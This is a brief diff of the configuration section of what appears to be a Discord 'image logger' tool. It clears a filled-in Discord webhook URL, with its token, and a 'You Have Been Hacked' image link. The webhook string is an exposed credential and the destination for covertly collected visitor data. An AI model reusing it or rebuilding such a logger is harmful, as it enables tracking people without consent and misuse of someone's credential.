@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335851193783812106/nO4xlazv3Q-dF1hbguq50T4xbMXievfIApj0PFWRpIhOoty8vBvsFllryFokjeXSh8Qm",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fcommons.wikimedia.org%2Fwiki%2FFile%3AYou_Have_Been_Hacked!.jpg&psig=AOvVaw0JuDBd_eX2JSaMlJj-hbAn&ust=1738648754025000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCNisobnpposDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "webhook": "",
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
